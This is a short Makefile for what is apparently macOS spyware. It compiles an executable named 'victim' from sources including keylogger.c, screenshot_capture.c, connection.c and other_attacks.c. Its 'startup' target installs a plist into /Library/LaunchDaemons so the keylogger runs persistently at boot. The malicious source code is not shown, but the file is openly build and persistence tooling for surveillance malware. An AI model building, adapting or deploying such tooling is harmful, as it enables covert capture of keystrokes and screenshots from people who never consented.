CC = gcc
CFLAGS = -framework ApplicationServices -framework Carbon
SOURCES = Victim_main.c screenshot_capture.c keylogger.c connection.c other_attacks.c
EXECUTABLE = victim
PLIST = keylogger.plist
#INSTALLDIR = /Users/$USER
COMP_FLAG = -std=c99 -Wall

all: $(SOURCES)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install:
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm /Library/LaunchDaemons/$(PLIST)

startup:
	cp $(PLIST) /Library/LaunchDaemons

clean:
	rm $(EXECUTABLE)